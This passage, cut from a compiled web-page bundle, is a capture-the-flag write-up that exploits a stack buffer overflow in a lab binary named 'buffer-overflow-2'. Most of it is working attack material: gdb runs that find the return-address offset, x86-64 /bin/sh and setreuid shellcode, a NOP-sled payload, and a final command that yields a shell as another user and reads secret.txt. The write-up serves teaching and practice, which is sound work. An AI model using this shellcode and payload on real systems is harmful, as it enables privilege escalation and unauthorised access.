Segmentation fault.\n0x0000000000004141 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+11)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+11)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414141 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+12)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+12)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000041414141 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+13)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+13)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000004141414141 in ?? ()\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000004141414141 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+14)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+14)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+15)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+15)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004005ab in concat_arg ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Once we have 6 x A's (",(0,x.jsx)(A.code,{children:"\\x41"}),') in the return address when the application crashes we have successfully, fully overwritten the EIP (Extended Instruction Pointer i.e. the "what do I execute next?" instruction register). You can see if we go ',(0,x.jsx)(A.code,{children:"1 byte"})," over, the crashed EIP register is showing no ",(0,x.jsx)(A.code,{children:"A"}),"'s at all, so our payload has over shot it."]}),"\n",(0,x.jsxs)(A.p,{children:[(0,x.jsx)(A.code,{children:"Payload = 154-5+6+14 = 169"})," so our entire payload going forward, ",(0,x.jsx)(A.strong,{children:"must"})," always be a total of ",(0,x.jsx)(A.code,{children:"169 bytes"})," to correctly overwrite the EIP so it points to our shellcode."]}),"\n",(0,x.jsx)(A.h3,{id:"shellcode-1",children:"Shellcode"}),"\n",(0,x.jsxs)(A.p,{children:["We need 2 x particular kinds of shellcode here, 1) ",(0,x.jsx)(A.code,{children:"/bin/sh"})," shellcode to drop us into a shell and 2) ",(0,x.jsx)(A.code,{children:"setreuid"})," shellcode to set our UID to that of the user we're trying to have the permissions for."]}),"\n",(0,x.jsxs)(A.p,{children:[(0,x.jsx)(A.code,{children:"/bin/sh"})," = ",(0,x.jsx)(A.code,{children:"\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05"})]}),"\n",(0,x.jsx)(A.h3,{id:"shellcode--pwntools",children:"shellcode + pwntools"}),"\n",(0,x.jsxs)(A.p,{children:["We want shellcode that calls ",(0,x.jsx)(A.code,{children:"setreuid"})," to set our ",(0,x.jsx)(A.code,{children:"uid=1003"})," i.e. ",(0,x.jsx)(A.code,{children:"user3"})," permissions."]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"$ pwn shellcraft -f d amd64.linux.setreuid 1003\n\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\n"})}),"\n",(0,x.jsx)(A.p,{children:"total length of shellcode:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-python",children:'Python 2.7.16 (default, Jul 19 2019, 23:05:17)\n[GCC 7.3.1 20180712 (Red Hat 7.3.1-6)] on linux2\nType "help", "copyright", "credits" or "license" for more information.\n>>> len(\'\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05\')\n54\n'})}),"\n",(0,x.jsxs)(A.p,{children:["Our new equation is now: ",(0,x.jsx)(A.code,{children:"NOP + shellcode + pad + return_address = 169"}),", which is ",(0,x.jsx)(A.code,{children:"NOP + 54 + 15 + 6 = 169"}),", so ",(0,x.jsx)(A.code,{children:"NOP=94"}),"."]}),"\n",(0,x.jsxs)(A.p,{children:["Let's write our payload against bytes, ",(0,x.jsx)(A.code,{children:"payload = '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + '\\x41'*6"})]}),"\n",(0,x.jsx)(A.h3,{id:"nop-sled--return-address",children:"NOP sled + Return Address"}),"\n",(0,x.jsxs)(A.p,{children:["The 6 * ",(0,x.jsx)(A.code,{children:"\\x41"}),"'s at the end are just a place holder for the return address we want- which is the address of the start of our shellcode."]}),"\n",(0,x.jsx)(A.p,{children:"How we find the a return address that will hit the start of our shellcode?"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + 'A'*6\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + 'A'*6\")\nnew word is doggo1fjqXHj;XH1I//bin/shAPHRWHj<XH1BBBBBBBBBBBBAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n(gdb) x/100x $rsp-200\n0x7fffffffe8c8: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff\n0x7fffffffe8d8: 0xffffecea      0x00007fff      0x67676f64      0x9090906f\n0x7fffffffe8e8: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe8f8: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe908: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe918: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe928: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe938: 0x90909090      0x90909090      0x90909090      0xff319090\n0x7fffffffe948: 0x03eabf66      0x4858716a      0x050ffe89      0x48583b6a\n0x7fffffffe958: 0xb849d231      0x69622f2f      0x68732f6e      0x08e8c149\n0x7fffffffe968: 0x89485041      0x485752e7      0x050fe689      0x48583c6a\n0x7fffffffe978: 0x050fff31      0x42424242      0x42424242      0x42424242\n0x7fffffffe988: 0x41414141      0x00004141      0xffffea88      0x00007fff\n0x7fffffffe998: 0x00000000      0x00000002      0x004005e0      0x00000000\n0x7fffffffe9a8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000\n0x7fffffffe9b8: 0xffffea88      0x00007fff      0x00040000      0x00000002\n0x7fffffffe9c8: 0x004005ac      0x00000000      0x00000000      0x00000000\n0x7fffffffe9d8: 0x794daa23      0x97320a39      0x00400450      0x00000000\n0x7fffffffe9e8: 0xffffea80      0x00007fff      0x00000000      0x00000000\n0x7fffffffe9f8: 0x00000000      0x00000000      0xa1edaa23      0x68cdf546\n0x7fffffffea08: 0x2d49aa23      0x68cde5f1      0x00000000      0x00000000\n0x7fffffffea18: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffea28: 0xffffeaa0      0x00007fff      0xf7ffe130      0x00007fff\n0x7fffffffea38: 0xf7de7656      0x00007fff      0x00000000      0x00000000\n0x7fffffffea48: 0x00000000      0x00000000      0x00000000      0x00000000\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Pick any address that's full of NOPs (\\x90) e.g. ",(0,x.jsx)(A.code,{children:"0x7f ff ff ff e8 f8"})]}),"\n",(0,x.jsxs)(A.p,{children:["in little edian format, our return address example would look like this ",(0,x.jsx)(A.code,{children:"\\xf8\\xe8\\xff\\xff\\xff\\x7f"})]}),"\n",(0,x.jsx)(A.h3,{id:"final-payload",children:"Final Payload"}),"\n",(0,x.jsx)(A.p,{children:"Let's recap, we now have:"}),"\n",(0,x.jsxs)(A.ol,{children:["\n",(0,x.jsx)(A.li,{children:"the offset (169)"}),"\n",(0,x.jsx)(A.li,{children:"the pad (15)"}),"\n",(0,x.jsx)(A.li,{children:"the NOP sled (94)"}),"\n",(0,x.jsx)(A.li,{children:"our shellcode (54)"}),"\n",(0,x.jsx)(A.li,{children:"the return address that hits the start of our shellcode (6)"}),"\n"]}),"\n",(0,x.jsxs)(A.p,{children:["Payload = ",(0,x.jsx)(A.code,{children:"'\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + '\\x18\\xe9\\xff\\xff\\xff\\x7f'"})]}),"\n",(0,x.jsx)(A.h3,{id:"capture-the-flag",children:"Capture the Flag"}),"\n",(0,x.jsxs)(A.p,{children:["We take the Payload from above, and run it on the CLI against the ",(0,x.jsx)(A.code,{children:"bufferoverflow-2"})," application like so:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"[user1@ip-10-10-50-188 overflow-4]$  ./buffer-overflow-2 $(python -c \"print '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + '\\x18\\xe9\\xff\\xff\\xff\\x7f'\")\nnew word is doggo1fjqXHj;XH1I//bin/shAPHRWHj<XH1BBBBBBBBBBBB\nsh-4.2$ id\nuid=1003(user3) gid=1001(user1) groups=1001(user1)\nsh-4.2$ cat secret.txt\nwowanothertime!!\n"})}),"\n",(0,x.jsx)(A.p,{children:"Success!"}),"\n",(0,x.jsx)(A.admonition,{title:"beware",type:"danger",children:(0,x.jsxs)(A.p,{children:["shellcode for ",(0,x.jsx)(A.code,{children:"setreuid"})," apparently doesn't work inside gdb/r2, you must deliver the payload directly to the binary, outside of a debugger."]})}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + '\\x18\\xe9\\xff\\xff\\xff\\x7f'\")\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print '\\x90'*94 + '\\x31\\xff\\x66\\xbf\\xeb\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + '\\x42'*15 + '\\x18\\xe9\\xff\\xff\\xff\\x7f'\")\nMissing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64\nnew word is doggo1fjqXHj;XH1I//bin/shAPHRWHj<XH1BBBBBBBBBBBB\nprocess 3400 is executing new program: /usr/bin/bash\nsh-4.2$ id\nDetaching after fork from child process 3406.\nuid=1001(user1) gid=1001(user1) groups=1001(user1)\nsh-4.2$\n"})})]})}function a(e={}){const{wrapper:A}={...(0,r.R)(),...e.components};return A?(0,x.jsx)(A,{...e,children:(0,x.jsx)(d,{...e})}):d(e)}}}]);